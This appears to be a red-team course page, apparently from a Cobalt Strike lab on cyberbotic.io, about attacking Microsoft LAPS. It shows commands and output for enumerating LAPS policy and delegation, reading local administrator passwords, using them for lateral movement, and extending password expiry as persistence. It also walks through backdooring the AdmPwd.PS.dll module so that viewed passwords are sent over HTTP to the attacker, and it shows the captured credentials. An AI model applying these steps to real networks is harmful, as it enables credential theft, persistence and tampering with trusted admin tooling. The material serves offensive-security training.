---
description: Local Administrator Password Solution
---

# LAPS

Organisations often have a build process for physical and virtual machines within their environment.  It's common that everything is built from the same "gold image" to ensure consistency and compliance.  However, these processes can result in every machine having the same password on accounts such as the local administrator.  If one machine and therefore the local administrator password hash is compromised, an attacker may be able to move laterally to every machine in the domain using the same set of credentials.

LAPS is a Microsoft solution for managing the credentials of a local administrator account on every machine, either the default RID 500 or a custom account.  It ensures that the password for each account is different, random, and automatically changed on a defined schedule.  Permission to request and reset the credentials can be delegated, which are also auditable.  Here is a quick summary of how LAPS works:

1. The Active Directory schema is extended and adds two new properties to computer objects, called _ms-Mcs-AdmPwd_ and _ms-Mcs-AdmPwdExpirationTime_.
2. By default, the DACL on ms-Mcs-AdmPwd only grants read access to Domain Admins.  Each computer object is given permission to update these properties on itself.
3. Rights to read AdmPwd can be delegated to other principals (users, groups etc), which is typically done at the OU level.
4. A new GPO template is installed, which is used to deploy the LAPS configuration to machines (different policies can be applied to different OUs).
5. The LAPS client is also installed on every machine (commonly distributed via GPO or a third-party software management solution).
6. When a machine performs a gpupdate, it will check the AdmPwdExpirationTime property on its own computer object in AD. If the time has elapsed, it will generate a new password (based on the LAPS policy) and sets it on the ms-Mcs-AdmPwd property.

&#x20;

There are a few methods to hunt for the presence of LAPS.  If it's applied to a machine that you have access to, AdmPwd.dll will be on disk.

## Enumeration

{% code overflow="wrap" %}
```powershell
# If it's applied to a machine that you have access to, AdmPwd.dll will be on disk.
ls C:\Program Files\LAPS\CSE
# Search for GPOs that have "LAPS" or some other descriptive term in the name.
beacon> powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl
# ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property).
beacon> powershell Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName
```
{% endcode %}

If we locate the correct GPO, we can download the LAPS configuration from the gpcfilesyspath.

{% code overflow="wrap" %}
```powershell
beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/16/2022 12:39:19   Applications
          dir     09/13/2022 15:38:58   Microsoft
          dir     08/16/2022 12:23:37   Preferences
          dir     08/16/2022 12:21:04   Scripts
 575b     fil     08/16/2022 12:22:23   comment.cmtx
 920b     fil     08/16/2022 12:22:23   Registry.pol

beacon> download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol
[*] started download of \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol (920 bytes)
[*] download of Registry.pol is complete
```
{% endcode %}

The `Parse-PolFile` cmdlet from the [GPRegistryPolicyParser](https://github.com/PowerShell/GPRegistryPolicyParser) package can be used to convert this file into human-readable format.

```powershell
PS C:\Users\Attacker> Parse-PolFile .\Desktop\Registry.pol

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordComplexity
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 3

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordLength
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 14

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordAgeDays
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 30

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : AdminAccountName
ValueType   : REG_SZ
ValueLength : 20
ValueData   : LapsAdmin

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : AdmPwdEnabled
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 1

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PwdExpirationProtectionEnabled
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 0
```

This tells us that:

* Password complexity is upper, lower and numbers.
* Password length is 14.
* Passwords are changed every 30 days.
* The LAPS managed account name is LapsAdmin.
* Password expiration protection is disabled.

## Reading ms-Mcs-AdmPwd

We can discover which principals are allowed to read the ms-Mcs-AdmPwd attribute by reading its DACL on each computer object.

{% code overflow="wrap" %}
```powershell
beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier

ObjectDN                                                      SecurityIdentifier                          
--------                                                      ------------------                          
CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io         S-1-5-21-569305411-121244042-2357301523-1107
CN=WEB,OU=Web Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io   S-1-5-21-569305411-121244042-2357301523-1108
CN=SQL-2,OU=SQL Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io S-1-5-21-569305411-121244042-2357301523-1108
CN=WKSTN-1,OU=Workstations,DC=dev,DC=cyberbotic,DC=io         S-1-5-21-569305411-121244042-2357301523-1107

beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
DEV\Developers

beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1108
DEV\Support Engineers
```
{% endcode %}

Dedicated tooling such as the [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) also exist.  `Find-LAPSDelegatedGroups` will query each OU and find domain groups that have delegated read access.

{% code overflow="wrap" %}
```powershell
beacon> powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
beacon> powershell Find-LAPSDelegatedGroups

OrgUnit                                              Delegated Groups     
-------                                              ----------------     
OU=Workstations,DC=dev,DC=cyberbotic,DC=io           DEV\Developers       
OU=Servers,DC=dev,DC=cyberbotic,DC=io                DEV\Support Engineers
OU=Web Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io DEV\Support Engineers
OU=SQL Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io DEV\Support Engineers
```
{% endcode %}

`Find-AdmPwdExtendedRights` goes a little deeper and queries each individual computer for users that have "All Extended Rights".  This will reveal any users that can read the attribute without having had it specifically delegated to them.

To get a computer's password, simply read the attribute.

{% code overflow="wrap" %}
```powershell
beacon> getuid
[*] You are DEV\bfarmer

beacon> powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd

ms-mcs-admpwd 
------------- 
1N3FyjJR5L18za
```
{% endcode %}

The `make_token` command is an easy way to leverage it.

```powershell
beacon> make_token .\LapsAdmin 1N3FyjJR5L18za
[+] Impersonated DEV\bfarmer

beacon> ls \\wkstn-1\c$
[*] Listing: \\wkstn-1\c$\

Size     Type    Last Modified         Name
----     ----    -------------         ----
          dir     08/16/2022 08:17:30   $Recycle.Bin
          dir     08/15/2022 22:22:31   $WinREAgent
          dir     01/27/2022 18:18:49   Documents and Settings
          dir     12/07/2019 09:14:52   PerfLogs
          dir     08/22/2022 00:15:03   Program Files
          dir     10/06/2021 13:57:25   Program Files (x86)
          dir     09/14/2022 09:50:27   ProgramData
          dir     08/17/2022 17:52:54   Recovery
```

## Password Expiration Protection

One of the LAPS policy settings is called "Do not allow password expiration time longer than required by policy".  In short, this is the _PwdExpirationProtectionEnabled_ configuration that we read from the Registry.pol file.  When enabled, this policy prevents a user or computer setting the expiration date of a password beyond the password age specified in the _PasswordAgeDays_ setting.  We also read from Registry.pol that this is set to 30 days.  For instance - if a password is set on 1st January 2022, its expiration will be 31st January 2022.  If password expiration protection is enabled and we attempted to modify its expiration date beyond 31st January, it would trigger an automatic reset of that password.

If the policy setting is left "not configured" in the GPO, then password expiration protection is disabled by default.

Since we were able to compromise WKSTN-1 using its LAPS password, we can set its expiration long into the future as a form of persistence.  The expiration date is an 18-digit timestamp calculated as the number of 100-nanosecond intervals that have elapsed since 1st January 1601 (don't ask).

{% code overflow="wrap" %}
```powershell
beacon> powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime

ms-mcs-admpwdexpirationtime ms-mcs-admpwd 
--------------------------- ------------- 
         133101494718702551 1N3FyjJR5L18za
```
{% endcode %}

Where `133101494718702551` is Thursday, 13 October 2022 15:44:31 GMT.

[https://www.epochconverter.com/ldap](https://www.epochconverter.com/ldap) can translate between these timestamps and human-readable formats.

If we wanted to push the expiry out by 10 years, we can overwrite this value with `136257686710000000`.  Every computer has delegated access to write to this password field, so we must elevate to SYSTEM on WKSTN-1.

{% code overflow="wrap" %}
```powershell
beacon> run hostname
wkstn-1

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> powershell Set-DomainObject -Identity wkstn-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '136257686710000000'} -Verbose
Setting 'ms-Mcs-AdmPwdExpirationTime' to '136257686710000000' for object 'WKSTN-1$'
```
{% endcode %}

The expiration date will still be visible to admins and a manual reset will change the password and restore the expiration date.

<figure><img src="../../.gitbook/assets/laps-ui.webp" alt=""><figcaption></figcaption></figure>

## LAPS Backdoors

There are some techniques that we can leverage to backdoor the LAPS administrative tooling and obtain a copy of passwords when viewed by an admin.  This module will demonstrate this idea using the LAPS PowerShell cmdlet `Get-AdmPwdPassword`.  If installed on a machine, the LAPS PowerShell modules can be found under `C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS`.

```powershell
beacon> ls
[*] Listing: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/16/2022 13:04:13   en-US
 24kb     fil     05/05/2021 12:04:14   AdmPwd.PS.dll
 5kb      fil     04/28/2021 18:56:38   AdmPwd.PS.format.ps1xml
 4kb      fil     04/28/2021 18:56:38   AdmPwd.PS.psd1
 26kb     fil     05/05/2021 12:04:14   AdmPwd.Utils.dll
```

Since PowerShell heavily utilises the .NET Framework, the DLLs here are written in C# which makes them fairly trivial to download, modify and re-upload.  Download `AdmPwd.PS.dll` and `AdmPwd.Utils.dll`, sync them to your attacking machine and open AdmPwd.PS.dll with dnSpy.  Use the Assembly Explorer to drill down into the DLL, namespaces and classes until you find the `GetPassword` method.

<figure><img src="../../.gitbook/assets/dnspy.webp" alt=""><figcaption></figcaption></figure>

This method calls `DirectoryUtils.GetPasswordInfo` which returns a `PasswordInfo` object.  You can click on the name and dnSpy will take you to the class definition.  It contains properties for `ComputerName`, `DistinguishedName`, `Password` and `ExpirationTimestamp`.  The password is simply the plaintext password that is shown to the admin.

Let's modify the code to send the plaintext passwords to us over an HTTP GET request.

**This is obviously an irresponsible method to use in the real world, because the plaintext password is being sent unencrypted over the wire. This is just an example.**

Go back to the GetPassword method, right-click somewhere in the main window and select _Edit Method_.  The first thing we need to do is add a new assembly reference, using the little button at the bottom of the edit window.

<figure><img src="../../.gitbook/assets/add-reference.webp" alt=""><figcaption></figcaption></figure>

Use the search box to find and add `System.Net`.

This code will simply instantiate a new `WebClient` and call the `DownloadString` method, passing the computer name and password in the URI.

\


<figure><img src="../../.gitbook/assets/backdoor.webp" alt=""><figcaption></figcaption></figure>

Once the modifications are in place, click the _Compile_ button in the bottom-right of the edit window.  Then select _File > Save Module_ to write the changes to disk.  Upload the DLL back to the target to overwrite the existing file.

```
beacon> upload C:\Users\Attacker\Desktop\AdmPwd.PS.dll
```

One downside to this tactic is that it will break the digital signature of the DLL, but it will not prevent PowerShell from using it.

{% code overflow="wrap" %}
```powershell
beacon> powershell Get-AuthenticodeSignature *.dll

    Directory: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS

SignerCertificate                         Status                                 Path                                  
-----------------                         ------                                 ----                                  
                                          NotSigned                              AdmPwd.PS.dll                         
ABDCA79AF9DD48A0EA702AD45260B3C03093FB4B  Valid                                  AdmPwd.Utils.dll 
```
{% endcode %}

As nlamb on Workstation 1, grab the LAPS password for a computer.

```powershell
PS C:\Users\nlamb> Get-AdmPwdPassword -ComputerName sql-2 | fl

ComputerName        : SQL-2
DistinguishedName   : CN=SQL-2,OU=SQL Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io
Password            : VloWch1sc5Hl40
ExpirationTimestamp : 9/17/2022 12:46:28 PM
```

You should see a corresponding hit in your CS weblog.

```powershell
09/14 11:49:32 visit (port 80) from: 10.10.122.254
	Request: GET /
	Response: 404 Not Found
	null
	= Form Data=
	computer   = SQL-2
	pass       = VloWch1sc5Hl40
```
